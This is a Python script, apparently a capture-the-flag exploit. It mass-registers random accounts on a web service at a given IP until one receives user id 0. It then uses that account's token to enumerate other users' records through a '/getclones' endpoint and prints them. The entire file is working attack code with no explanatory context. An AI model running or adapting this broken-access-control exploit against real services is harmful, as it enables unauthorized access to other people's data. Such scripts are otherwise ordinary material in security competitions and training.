#!/usr/bin/env python3
import sys
import requests
import time
import random
import string

ip = sys.argv[1]

def random_username(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def random_password(size=8, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

NUM_OF_USERS = 256

ADDRESS = f'http://{ip}:5000'


for _ in range(NUM_OF_USERS):
    username = random_username()
    password = random_password()

    response = requests.post(f'{ADDRESS}/signup', json={'username': username, 'password': password})

    if response.status_code == 200:
        response = requests.post(f'{ADDRESS}/signin', json={'username': username, 'password': password})
        user_info = response.json()
        print(f"User ID: {user_info['id']}")
        if user_info['id'] == 0:
            user_id = 1
            for _ in range(NUM_OF_USERS):
                resp = requests.post(
                    f'{ADDRESS}/getclones',
                    json={
                        'my_id': 0,
                        'token': user_info['token'],
                        'user_id': user_id,
                    }
                )
                user_id += 1
                if not resp.ok:
                    break
                print(resp.json(), flush=True)